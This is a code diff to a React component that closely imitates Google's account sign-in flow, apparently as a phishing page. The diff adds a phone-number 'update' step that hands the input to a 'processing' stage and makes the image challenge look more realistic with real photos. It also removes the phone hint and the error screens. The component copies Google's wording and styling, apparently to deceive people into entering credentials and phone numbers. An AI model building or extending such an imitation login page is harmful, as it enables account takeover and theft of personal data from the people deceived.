+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Back
+                  </button>
+                  <button onClick={() => phoneUpdateInput.length >= 7 && nav('processing', 'phone_update', phoneUpdateInput)}
+                    style={{ backgroundColor: phoneUpdateInput.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: phoneUpdateInput.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneUpdateInput.length >= 7 ? 'pointer' : 'default' }}>
+                    Update
+                  </button>
+                </div>
+              </>
+            )}
+
             {/* ── Processing ── */}
             {step === 'processing' && (
               <>
@@ -2203,25 +2234,15 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                           if (next.has(i)) next.delete(i); else next.add(i);
                           setSelectedImgs(next);
                         }} style={{
-                          position: 'relative', height: 86, background: img.bg, cursor: 'pointer',
+                          position: 'relative', height: 86, cursor: 'pointer', overflow: 'hidden',
                           outline: selectedImgs.has(i) ? '3px solid #4285F4' : '3px solid transparent',
                           outlineOffset: -3,
                         }}>
+                          <img src={img.url} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block', pointerEvents: 'none' }} />
                           {selectedImgs.has(i) && (
                             <div style={{ position: 'absolute', top: 4, right: 4, width: 22, height: 22, borderRadius: '50%', background: '#4285F4', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                               <svg viewBox="0 0 24 24" width="13" height="13" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                             </div>
-                          )}
-                          {img.car && (
-                            <svg viewBox="0 0 48 22" width="40" height="18" style={{ position: 'absolute', bottom: 8, left: '50%', transform: 'translateX(-50%)', opacity: 0.72 }}>
-                              <rect x="4" y="7" width="40" height="10" rx="2" fill="#444"/>
-                              <rect x="10" y="3" width="24" height="8" rx="2" fill="#666"/>
-                              <circle cx="13" cy="17.5" r="3.5" fill="#222"/><circle cx="13" cy="17.5" r="1.8" fill="#aaa"/>
-                              <circle cx="35" cy="17.5" r="3.5" fill="#222"/><circle cx="35" cy="17.5" r="1.8" fill="#aaa"/>
-                              <rect x="12" y="4" width="6" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
-                              <rect x="20" y="4" width="6" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
-                              <rect x="28" y="4" width="5" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
-                            </svg>
                           )}
                         </div>
                       ))}
@@ -2281,9 +2302,6 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                           <div style={{ fontSize: 8, color: '#999' }}>Privacy - Terms</div>
                         </div>
                       </div>
-                      <p style={{ fontSize: 12, color: subText, margin: '14px 0 0' }}>
-                        You can also verify via phone ●●●●●●●●{googlePhone}
-                      </p>
                     </div>
                     <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                       <button onClick={() => setStep('password')} style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
@@ -2300,42 +2318,6 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
-            {/* ── Error states ── */}
-            {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
-              <>
-                <div>
-                  <div style={{
-                    display: 'flex', alignItems: 'flex-start', gap: 10, padding: '12px 14px',
-                    background: isDark ? '#2d1212' : '#fef2f2',
-                    border: `1px solid ${isDark ? '#7f1d1d' : '#fecaca'}`, borderRadius: 4, marginBottom: 16,
-                  }}>
-                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
-                      <circle cx="12" cy="12" r="10" stroke="#dc2626" strokeWidth="1.5"/>
-                      <path d="M12 8v4m0 4h.01" stroke="#dc2626" strokeWidth="1.5" strokeLinecap="round"/>
-                    </svg>
-                    <p style={{ fontSize: 14, color: '#dc2626', margin: 0, lineHeight: 1.5 }}>
-                      {step === 'error-email'
-                        ? "Couldn't find your Google Account. Try entering your full email address."
-                        : step === 'error-password'
-                        ? "Wrong password. Try again or click Forgot password to reset it."
-                        : "Wrong code. Try entering the code again or request a new one."}
-                    </p>
-                  </div>
-                </div>
-                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                  <button
-                    onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'phone-code')}
-                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
-                    Try again
-                  </button>
-                  {step === 'error-password' && (
-                    <button style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0' }}>
-                      Forgot password?
-                    </button>
-                  )}
-                </div>
-              </>
-            )}
           </div>
         </div>
       </div>
